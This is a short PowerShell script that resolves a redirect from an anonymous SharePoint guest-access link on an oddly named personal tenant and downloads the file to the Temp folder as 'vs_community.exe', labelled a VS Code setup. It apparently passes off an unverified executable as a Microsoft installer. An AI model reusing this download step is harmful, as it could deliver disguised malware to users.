Function Get-RedirectedUrl
{
    Param (
        [Parameter(Mandatory=$true)]
        [String]$URL
    )
 
    $request = [System.Net.WebRequest]::Create($url)
    $request.AllowAutoRedirect=$false
    $response=$request.GetResponse()
 
    If ($response.StatusCode -eq "Found")
    {
        $response.GetResponseHeader("Location")
    }
}

$url = 'https://cheekandchongsupinthesmoke-my.sharepoint.com/personal/bulletformyvalentine_cheekandchongsupinthesmoke_onmicrosoft_com/_layouts/15/guestaccess.aspx?docid=1197a59ab31594530b932e6fa1b79ea0e&authkey=AQJTZdnA_Y4J7gnCeW6wtsM'
$codeSetupUrl = Get-RedirectedUrl -URL $url

$vscodeSetup = "${env:Temp}\vs_community.exe"

try
{
    (New-Object System.Net.WebClient).DownloadFile($codeSetupUrl, $vscodeSetup)
}
catch
{
    Write-Error "Failed to download VSCode Setup"
}

